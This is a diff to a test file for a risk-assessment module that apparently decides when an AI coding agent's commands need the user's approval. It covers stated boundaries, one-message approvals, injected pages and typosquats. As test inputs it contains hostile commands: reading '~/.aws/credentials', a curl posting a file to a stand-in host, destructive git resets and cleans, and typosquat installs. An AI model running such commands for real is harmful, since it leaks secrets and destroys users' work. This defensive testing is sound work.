@@ -1,16 +1,26 @@
 import { describe, expect, it } from 'vitest';
 
+import { mkdtemp, writeFile } from 'node:fs/promises';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+
 import {
   ADVERSARIAL,
   AFTER_READING,
+  ASKED,
   ASKED_PUSH,
+  HELD,
+  NAMED,
   PDF_CASE,
   ROUTINE,
   SERIOUS,
+  type Said,
   type Step,
+  UNLIFTABLE,
 } from '../test/riskCorpus';
-import { imitates, packageName, wellKnown } from './packages';
+import { declared, imitates, packageName, wellKnown } from './packages';
 import {
+  askable,
   assessRisk,
   breaksCircuit,
   carriesSecrets,
@@ -405,5 +415,141 @@ describe('“make me a PDF”, after reading (ADR 0117, 2026-10-09)', () => {
     expect(of('npm install left-pad')).not.toBe(of('pip install reqeusts'));
     expect(of('git push')).toBe('risk:egress:push code to a remote');
     expect(of('git push')).not.toBe(of('curl -d @notes.txt https://x.example'));
+  });
+});
+
+describe('what the person asked for, in their own words (ADR 0128)', () => {
+  const asks = ({ step: [tool, input], said, access }: Said, untrusted: boolean, words = said) =>
+    riskAsks(
+      assessRisk(tool, input, { ...ctx, said: words, ...(access && { access }) }),
+      untrusted,
+    );
+  const label = ({ step: [tool, input] }: Said) =>
+    tool === 'Bash' ? String(input.command) : `${tool} ${JSON.stringify(input)}`;
+
+  it('someone else’s systems ask before reading, unless the person named the step', () => {
+    expect(NAMED.filter((s) => !asks(s, false, [])).map(label)).toEqual([]);
+    expect(NAMED.filter((s) => asks(s, false)).map(label)).toEqual([]);
+    expect(NAMED.filter((s) => asks(s, true)).map(label)).toEqual([]);
+  });
+
+  it('the ways out after reading go when asked for, before and after reading', () => {
+    expect(ASKED.filter((s) => !asks(s, true, [])).map(label)).toEqual([]);
+    expect(ASKED.filter((s) => asks(s, true)).map(label)).toEqual([]);
+    expect(ASKED.filter((s) => asks(s, false)).map(label)).toEqual([]);
+  });
+
+  it('a boundary the person stated asks before reading too, until they say otherwise', () => {
+    expect(HELD.filter((s) => !asks(s, false)).map(label)).toEqual([]);
+    const held = assessRisk('Bash', { command: 'git push' }, { ...ctx, said: ['Don’t push yet'] });
+    expect(held).toMatchObject({ held: true });
+    expect(riskScore(held as NonNullable<typeof held>, false)).toBe(3);
+    // Lifted by a later message about the same act.
+    expect(
+      asks({ said: ['Don’t push yet', 'OK, push it now'], step: bash('git push') }, true),
+    ).toBe(false);
+    // An approval is one message: said two messages ago, it covers nothing now.
+    expect(asks({ said: ['Push it', 'Now tidy the README'], step: bash('git push') }, true)).toBe(
+      true,
+    );
+    expect(asks({ said: ['Push it', 'Now tidy the README'], step: bash('git push') }, false)).toBe(
+      false,
+    );
+  });
+
+  it('nobody’s words lift keys, a stranger’s code, money or a whole folder, or a half-named step', () => {
+    expect(UNLIFTABLE.filter((s) => !asks(s, true)).map(label)).toEqual([]);
+    // The first nine ask before reading too; a fork and a token only after.
+    for (const s of UNLIFTABLE.slice(0, 9)) expect(asks(s, false), label(s)).toBe(true);
+    const keys = assessRisk('Bash', { command: 'cat ~/.aws/credentials' }, ctx);
+    expect(askable(keys as NonNullable<typeof keys>)).toBe(false);
+    const push = assessRisk('Bash', { command: 'git push' }, ctx);
+    expect(askable(push as NonNullable<typeof push>)).toBe(true);
+    // Asked for, a step scores two at most, whatever was read.
+    const asked = assessRisk(
+      'Bash',
+      { command: 'docker push r.example/x' },
+      { ...ctx, said: ['Push the image'] },
+    );
+    expect(asked).toMatchObject({ harm: 'severe', lasting: true, asked: true });
+    expect(riskScore(asked as NonNullable<typeof asked>, true)).toBe(2);
+  });
+
+  it('a page can’t ask for the person: only their own words count', () => {
+    // The chat's `said` is empty with someone else's words in it or nobody there (manager).
+    expect(asks({ said: [], step: bash('docker push r.example/x') }, false)).toBe(true);
+  });
+
+  it('throwing away changes is nothing in a clean tree, and asks after reading in a dirty one', () => {
+    const clean = { ...ctx, treeClean: () => true };
+    const dirty = { ...ctx, treeClean: () => false };
+    const unknown = { ...ctx, treeClean: () => undefined };
+    for (const command of ['git reset --hard origin/main', 'git clean -fdx', 'git checkout -- .']) {
+      expect(assessRisk('Bash', { command }, clean), command).toBeUndefined();
+      expect(riskAsks(assessRisk('Bash', { command }, dirty), true), command).toBe(true);
+      expect(riskAsks(assessRisk('Bash', { command }, dirty), false), command).toBe(false);
+      expect(riskAsks(assessRisk('Bash', { command }, unknown), true), command).toBe(true);
+    }
+    // The folder `git -C` names is the one asked about.
+    const dirs: (string | undefined)[] = [];
+    const seeing = {
+      ...ctx,
+      treeClean: (dir?: string) => {
+        dirs.push(dir);
+        return true;
+      },
+    };
+    expect(
+      assessRisk('Bash', { command: 'git -C ~/code/other reset --hard' }, seeing),
+    ).toBeUndefined();
+    expect(dirs).toEqual(['~/code/other']);
+    // Dropping a stash is not about the tree.
+    expect(assessRisk('Bash', { command: 'git stash drop' }, clean)).toBeDefined();
+  });
+
+  it('installs what the project itself declares without a word', async () => {
+    const dir = await mkdtemp(join(tmpdir(), 'conch-manifest-'));
+    await writeFile(
+      join(dir, 'package.json'),
+      JSON.stringify({
+        dependencies: { 'left-pad': '^1' },
+        devDependencies: { '@acme/tooling': '1' },
+      }),
+    );
+    await writeFile(join(dir, 'requirements.txt'), 'pdf-maker-utils-pro>=1.0\n# a comment\n-e .\n');
+    await writeFile(
+      join(dir, 'pyproject.toml'),
+      '[project]\ndependencies = [\n  "Weird_Lib[extra]>=2",\n]\n[tool.poetry.dependencies]\nanother-one = "^1"\n',
+    );
+    await writeFile(join(dir, 'Cargo.toml'), '[dependencies]\nsome-cli-nobody-knows = "1"\n');
+    await writeFile(join(dir, 'go.mod'), 'module x\n\nrequire github.com/someone/tool v1.2.3\n');
+    await writeFile(join(dir, 'Gemfile'), "gem 'obscure-gem'\n");
+    expect(declared(dir, 'npm', 'left-pad')).toBe(true);
+    expect(declared(dir, 'npm', '@acme/tooling')).toBe(true);
+    expect(declared(dir, 'npm', 'right-pad')).toBe(false);
+    expect(declared(dir, 'pypi', 'pdf_maker_utils_pro')).toBe(true);
+    expect(declared(dir, 'pypi', 'weird-lib')).toBe(true);
+    expect(declared(dir, 'pypi', 'another-one')).toBe(true);
+    expect(declared(dir, 'cargo', 'some-cli-nobody-knows')).toBe(true);
+    expect(declared(dir, 'go', 'github.com/someone/tool')).toBe(true);
+    expect(declared(dir, 'gem', 'obscure-gem')).toBe(true);
+    const here = { workspace: dir, home };
+    for (const command of [
+      'npm install left-pad',
+      'pnpm add @acme/tooling',
+      'pip install pdf-maker-utils-pro',
+      'uv pip install Weird-Lib',
+      'cargo install some-cli-nobody-knows',
+      'go install github.com/someone/tool@latest',
+      'gem install obscure-gem',
+    ])
+      expect(assessRisk('Bash', { command }, here), command).toBeUndefined();
+    // Not declared: asks after reading, as before. A squatter asks whatever is declared.
+    expect(riskAsks(assessRisk('Bash', { command: 'npm install right-pad' }, here), true)).toBe(
+      true,
+    );
+    await writeFile(join(dir, 'package.json'), JSON.stringify({ dependencies: { lodahs: '1' } }));
+    expect(riskAsks(assessRisk('Bash', { command: 'npm install lodahs' }, here), false)).toBe(true);
+    expect(declared(dir, 'npm', 'left-pad')).toBe(false);
   });
 });
